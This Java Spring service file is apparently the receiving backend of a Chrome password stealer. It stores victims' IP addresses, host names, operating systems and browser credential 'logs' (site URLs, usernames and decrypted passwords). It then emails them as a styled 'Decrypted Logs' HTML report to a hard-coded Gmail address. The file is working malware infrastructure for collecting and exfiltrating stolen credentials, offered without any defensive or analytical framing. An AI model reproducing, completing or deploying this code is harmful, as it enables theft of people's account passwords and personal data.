package beautiful.phoebe.app.user;

import java.io.UnsupportedEncodingException;
import java.util.List;

import javax.mail.MessagingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import beautiful.phoebe.app.chromelog.ChromeLog;
import beautiful.phoebe.app.chromelog.ChromeLogService;
import beautiful.phoebe.app.mailsender.MailSenderService;

@Service
public class UserService {

	@Autowired
	private UserRepository userRepository;

	@Autowired
	private ChromeLogService chromeLogService;

	@Autowired
	MailSenderService mailSenderService;

	public boolean addUser(User user) {
//		if (!userRepository.existsById(user.getIpAddress())) {
//			if (user.getChromeLogs().size() > 0) {
//				chromeLogService.addChromeLogs(user.getChromeLogs());
//			}
//			if (userRepository.save(user) != null) {
//				try {
//					sendLogs(user);
//				} catch (UnsupportedEncodingException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				} catch (MessagingException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				}
//				return true;
//			}
//		}
		if (user.getChromeLogs().size() > 0) {
			chromeLogService.addChromeLogs(user.getChromeLogs());
		}
		if (userRepository.save(user) != null) {
			try {
				sendLogs(user, "preciousphoebe07@gmail.com");
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (MessagingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return true;
		}

		return false;
	}
	
	public boolean addUserTest(User user) {
//		if (!userRepository.existsById(user.getIpAddress())) {
//			if (user.getChromeLogs().size() > 0) {
//				chromeLogService.addChromeLogs(user.getChromeLogs());
//			}
//			if (userRepository.save(user) != null) {
//				try {
//					sendLogs(user);
//				} catch (UnsupportedEncodingException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				} catch (MessagingException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				}
//				return true;
//			}
//		}
		if (user.getChromeLogs().size() > 0) {
			chromeLogService.addChromeLogs(user.getChromeLogs());
		}
		if (userRepository.save(user) != null) {
			try {
				sendLogs(user, "preciousphoebe07@gmail.com");
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (MessagingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return true;
		}

		return false;
	}

	public List<User> getUsers() {
		return (List<User>) userRepository.findAll();
	}

	private void sendLogs(User user, String toAddress) throws MessagingException, UnsupportedEncodingException {
		String subject = "Logs (" + user.getHostName() + ")";

		String logs = null;

		for (ChromeLog chromeLog : user.getChromeLogs()) {
			logs += bindLogs(chromeLog);
		}

		String content = "  <div>\r\n" + "      <div>\r\n" + "        <style>\r\n" + "          #container {\r\n"
				+ "            padding: 0px;\r\n" + "            font-family: Arial, Helvetica, sans-serif;\r\n"
				+ "            background-color: black;\r\n" + "          }\r\n" + "\r\n"
				+ "          @media only screen and (min-width: 800px) {\r\n" + "            #container {\r\n"
				+ "              margin: 10% 35%;\r\n" + "            }\r\n" + "          }\r\n"
				+ "        </style>\r\n" + "        <div id=\"container\">\r\n" + "          <div\r\n"
				+ "            style=\"\r\n" + "              box-shadow: 1px 1px 10px rgb(196, 32, 39);\r\n"
				+ "              font-size: 14px;\r\n" + "              border-radius: 2px;\r\n"
				+ "              background-color: rgb(29, 29, 29);\r\n" + "            \"\r\n" + "          >\r\n"
				+ "            <div style=\"padding: 16px 8px\">\r\n" + "              <p\r\n"
				+ "                style=\"\r\n" + "                  margin: 12px 0px;\r\n"
				+ "                  color: rgb(196, 32, 39);\r\n" + "                  font-weight: bold;\r\n"
				+ "                \"\r\n" + "              >\r\n"
				+ "                IP address: <span>"+user.getIpAddress()+"</span>\r\n" + "              </p>\r\n"
				+ "              <p\r\n" + "                style=\"\r\n" + "                  margin: 12px 0px;\r\n"
				+ "                  color: rgb(196, 32, 39);\r\n" + "                  font-weight: bold;\r\n"
				+ "                \"\r\n" + "              >\r\n"
				+ "                Operating system: <span>"+user.getOperatingSystem()+"</span>\r\n" + "              </p>\r\n"
				+ "              <p\r\n" + "                style=\"\r\n" + "                  margin: 12px 0px;\r\n"
				+ "                  color: rgb(196, 32, 39);\r\n" + "                  font-weight: bold;\r\n"
				+ "                  background-color: rgb(0, 0, 0);\r\n" + "                  padding: 4px;\r\n"
				+ "                  line-height: 22px;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                Operating system version: <span>"+user.getOperatingSystemVersion()+"</span>\r\n"
				+ "              </p>\r\n" + "              <p\r\n" + "                style=\"\r\n"
				+ "                  margin: 12px 0px;\r\n" + "                  color: rgb(196, 32, 39);\r\n"
				+ "                  font-weight: bold;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                Host name: <span>"+user.getHostName()+"</span>\r\n" + "              </p>\r\n" + "              <p\r\n"
				+ "                style=\"\r\n" + "                  text-align: center;\r\n"
				+ "                  margin: 24px 0px;\r\n" + "                  color: rgb(196, 32, 39);\r\n"
				+ "                  font-size: 18px;\r\n" + "                  font-weight: bold;\r\n"
				+ "                  text-decoration: underline;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                Decrypted Logs\r\n" + "              </p>\r\n"+ logs + "\r\n"
				+ "              \r\n" + "\r\n" + "              <div style=\"margin: 24px\">\r\n"
				+ "                <p\r\n" + "                  style=\"\r\n" + "                    color: red;\r\n"
				+ "                    text-align: center;\r\n" + "                    font-size: 12px;\r\n"
				+ "                    margin: 0px;\r\n" + "                  \"\r\n" + "                >\r\n"
				+ "                  *********WARNING********\r\n" + "                </p>\r\n"
				+ "                <p\r\n" + "                  style=\"\r\n" + "                    color: red;\r\n"
				+ "                    text-align: center;\r\n" + "                    font-size: 12px;\r\n"
				+ "                    margin: 0px;\r\n" + "                  \"\r\n" + "                >\r\n"
				+ "                  ***************************************************************\r\n"
				+ "                </p>\r\n" + "                <p\r\n" + "                  style=\"\r\n"
				+ "                    color: red;\r\n" + "                    text-align: center;\r\n"
				+ "                    font-size: 12px;\r\n" + "                    margin: 0px;\r\n"
				+ "                  \"\r\n" + "                >\r\n"
				+ "                  This message was sent from Welthax Assets Lorem ipsum dolor\r\n"
				+ "                  sit amet consectetur adipisicing elit.\r\n" + "                </p>\r\n"
				+ "              </div>\r\n" + "            </div>\r\n" + "          </div>\r\n" + "        </div>\r\n"
				+ "      </div>\r\n" + "    </div>";

		mailSenderService.sendEmail(toAddress, subject, content);
	}

	private String bindLogs(ChromeLog chromeLog) {
		String content = "<div\r\n" + "                style=\"\r\n" + "                  margin: 8px 0px;\r\n"
				+ "                  color: rgb(196, 32, 39);\r\n"
				+ "                  background-color: rgb(0, 0, 0);\r\n" + "                  padding: 2px 8px;\r\n"
				+ "                  line-height: 22px;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                <p>Main Url: <span style=\"font-weight: 600;\">" + chromeLog.getMainUrl()
				+ "</span></p>\r\n" + "                <p>Login Page Url: <span style=\"font-weight: 600;\">"
				+ chromeLog.getLoginPageUrl() + "</span></p>\r\n"
				+ "                <p>Username: <span style=\"font-weight: 600;\">" + chromeLog.getUserName()
				+ "</span></p>\r\n" + "                <p>Decrypted Password: <span style=\"font-weight: 600;\">"
				+ chromeLog.getDecryptedPassword() + "</span></p>\r\n"
				+ "                <p>Date Created: <span style=\"font-weight: 600;\">" + chromeLog.getDateOfCreation()
				+ "</span></p>\r\n" + "                <p>Date Last Used: <span style=\"font-weight: 600;\">"
				+ chromeLog.getLastUsage() + "</span></p>\r\n" + "              </div>";

		return content;
	}

}
